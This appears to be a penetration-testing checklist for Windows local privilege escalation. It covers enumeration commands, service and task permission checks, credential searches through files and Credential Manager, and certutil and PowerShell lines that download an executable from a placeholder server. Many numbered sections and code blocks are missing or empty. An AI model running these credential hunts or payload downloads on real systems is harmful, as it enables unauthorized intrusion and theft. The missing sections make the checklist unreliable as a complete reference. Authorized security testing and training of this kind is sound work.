# Windows Privilege Escalation

A practical checklist for enumerating a Windows host and identifying common local privilege escalation paths.

> **Scope:** Local Windows privilege escalation only. Active Directory and domain specific attacks are intentionally excluded.

> **Note on `wmic`:** Microsoft has deprecated the WMIC command line utility, and it's no longer installed by default on newer Windows 11 and Server builds. Where a `wmic` command below fails with "not recognized", use the equivalent `Get-CimInstance` PowerShell cmdlet instead (an equivalent is shown alongside most `wmic` commands in this checklist).

---

## 1. Quick Enumeration

Start with the basics before testing individual escalation paths.

### Current User

```cmd
whoami
whoami /user
whoami /groups
whoami /priv
echo %username%
```

### Host Information

```cmd
hostname
systeminfo
ver
wmic os get Caption,CSDVersion,OSArchitecture,Version
```

### Environment

```cmd
set
echo %PATH%
echo %TEMP%
echo %TMP%
```

### Current Directory

```cmd
cd
dir
```

## 6. Services

Services are one of the most important Windows privilege escalation areas.

### Enumerate Services

```cmd
sc query
sc query state= all
wmic service get name,displayname,pathname,startmode,startname
net start
```

PowerShell:

```powershell
Get-CimInstance Win32_Service | Select Name,DisplayName,State,StartMode,StartName,PathName
```

### Service Configuration

```cmd
sc qc <service>
```

### Service Permissions

With AccessChk:

```cmd
accesschk.exe -uwcqv <service>
```

Check the service executable:

```cmd
icacls "C:\Path\To\Service.exe"
```

Look for:

- Services running as SYSTEM
- User-writable service binaries
- User-writable service directories
- Weak service permissions
- Unquoted service paths
- Modifiable service configuration

---

## 7. Unquoted Service Paths

Find potentially vulnerable services:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /v "C:\Windows" | findstr /v """
```

Inspect individual services:

```cmd
sc qc <service>
```

A path such as:

```text
C:\Program Files\Example App\service.exe
```

is worth investigating when the path is unquoted and an attacker can write to one of the relevant directories.

Check permissions:

```cmd
icacls "C:\Program Files\Example App"
```

---

## 8. Weak Service File Permissions

Check the service executable:

```cmd
icacls "C:\Path\service.exe"
```

AccessChk:

```cmd
accesschk.exe -uwqs Users "C:\Path\service.exe"
accesschk.exe -uwqs "Authenticated Users" "C:\Path\service.exe"
```

Also inspect parent directories:

```cmd
icacls "C:\Path"
```

The important question is:

```text
Can my current user modify or replace a file that a privileged service executes?
```

## 9. Scheduled Tasks

### Enumerate

```cmd
schtasks /query /fo LIST /v
```

Save the output:

```cmd
schtasks /query /fo LIST /v > schtasks.txt
```

PowerShell:

```powershell
Get-ScheduledTask
```

Inspect task details:

```cmd
schtasks /query /tn "<task>" /fo LIST /v
```

Look for:

- Tasks running as SYSTEM
- Custom executables
- Writable scripts
- Writable task directories
- Tasks running frequently
- Tasks executing from unusual locations

Check permissions:

```cmd
icacls "C:\Path\script.bat"
icacls "C:\Path\program.exe"
```

## 10. AlwaysInstallElevated

Check both registry locations:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

A value of:

```text
0x1
```

in both locations can indicate a Windows Installer privilege escalation condition.

### Interesting Registry Areas

```cmd

reg query HKCU\SOFTWARE
```

### AutoRun

```cmd
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

```cmd

```

### Winlogon


Look for unusual configuration and credentials.

## 12. File and Directory Permissions

Check the current directory:

```cmd
icacls .
```

Search for writable directories:

```cmd
accesschk.exe -uwdqs Users C:\
```

Search for writable files:

```cmd
accesschk.exe -uwqs Users C:\*.*
```

Also check:

```cmd
accesschk.exe -uwdqs "Authenticated Users" C:\
accesschk.exe -uwqs "Authenticated Users" C:\*.*
```

Focus on writable locations containing:

- Services
- Scheduled task scripts
- Executables
- DLLs
- Startup files
- Configuration files

---

## 13. Sensitive Files and Credentials

Search common file types:

```cmd
dir /s /b *.txt *.ini *.xml *.config *.conf
```

Search for password-related filenames:

```cmd
dir /s /b *pass* *password* *cred* *secret*
```

Search file contents:

```cmd
findstr /spin "password" *.txt *.ini *.xml *.config
findstr /spin "passwd" *.txt *.ini *.xml *.config
findstr /spin "credential" *.txt *.ini *.xml *.config
```

PowerShell:

```powershell
Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue |
  Where-Object { $_.Name -match 'pass|cred|secret|config' }
```

Check application configuration files, scripts, backups, and deployment files for exposed credentials.

## 18. PATH Hijacking

Check the current PATH:

```cmd
echo %PATH%
```

Look for directories that are:

- Writable by the current user
- Located before privileged application directories
- Used by privileged services or scheduled tasks

Check permissions:

```cmd
icacls "C:\Path\Directory"
```

The key question is whether a privileged process searches a user-writable location for an executable or DLL.

---

## 19. DLL Search Order Hijacking

Look for privileged applications that load DLLs from writable directories.

Useful checks:

```cmd
tasklist /m
```

Inspect application directories:

```cmd
icacls "C:\Program Files\Application"
```

Tools that can help:

```text
Procmon
Process Explorer
WinPEAS
PowerUp
```

With Procmon, filter for:

```text
Result = NAME NOT FOUND
Operation = CreateFile
```

Then investigate DLLs or executables being searched for in writable locations.

## 21. Unattended Installation Files

Search for common unattended installation files:



## 22. Credential Manager

Enumerate stored credentials:

```cmd
cmdkey /list
```

PowerShell:

```powershell
Get-StoredCredential
```

> `Get-StoredCredential` is not a built-in cmdlet, it ships with the community `CredentialManager` module (`Install-Module CredentialManager`). Where that module isn't available, `cmdkey /list` above is the reliable built-in option.

Check whether stored credentials are associated with applications or services.

```cmd

```

Interesting privileges include:


## 26. SeTakeOwnershipPrivilege

Check:

```cmd
whoami /priv
```

If present and usable, investigate protected files or registry objects where ownership changes could enable further access.

Relevant tooling:

```text
takeown
icacls
AccessChk
```

Example enumeration:

```cmd
takeown /?
icacls /?
```

## 27. SeImpersonatePrivilege

Check:


Common security research tools include:

```text
PrintSpoofer
GodPotato
JuicyPotato
RoguePotato
```

Compatibility depends heavily on the Windows version, token configuration, and available services.

## 28. SeDebugPrivilege

Check:

```cmd
whoami /priv
```

This privilege can allow powerful interaction with other processes.

Investigate:

```text

AccessChk

```

Do not assume the privilege alone guarantees SYSTEM access.

## 34. Common Privilege Escalation Paths

Use this as a quick decision tree.

```text
LOW PRIVILEGED USER
        |
        +-- whoami /priv
        |      |
        |      +-- Dangerous token privilege?
        |
        +-- Services
        |      |
        |      +-- Unquoted path?
        |      +-- Weak service permissions?
        |      +-- Writable executable?
        |      +-- Writable service directory?
        |
        +-- Scheduled Tasks
        |      |
        |      +-- SYSTEM task?
        |      +-- Writable script?
        |      +-- Writable executable?
        |
        +-- Files
        |      |
        |      +-- Writable privileged executable?
        |      +-- Writable DLL?
        |      +-- Sensitive configuration?
        |
        +-- Registry
        |      |
        |      +-- AlwaysInstallElevated?
        |      +-- Writable autorun?
        |      +-- Interesting configuration?
        |
        +-- Credentials
        |      |
        |      +-- Config files?
        |      +-- PowerShell history?
        |      +-- Credential Manager?
        |      +-- Unattended files?
        |
        +-- Software
        |      |
        |      +-- Vulnerable application?
        |      +-- Vulnerable driver?
        |
        +-- Kernel
               |
               +-- Missing security patches?
```

## 35. File Transfer

For authorized lab environments, common Windows transfer mechanisms include:

```text
PowerShell
certutil
SMB
FTP
HTTP
```

Example with PowerShell:

```powershell
Invoke-WebRequest -Uri http://<server>/file.exe -OutFile C:\Temp\file.exe
```

Example with certutil:

```cmd
certutil.exe -urlcache -split -f http://<server>/file.exe C:\Temp\file.exe
```

Use only against systems where you have explicit authorization.
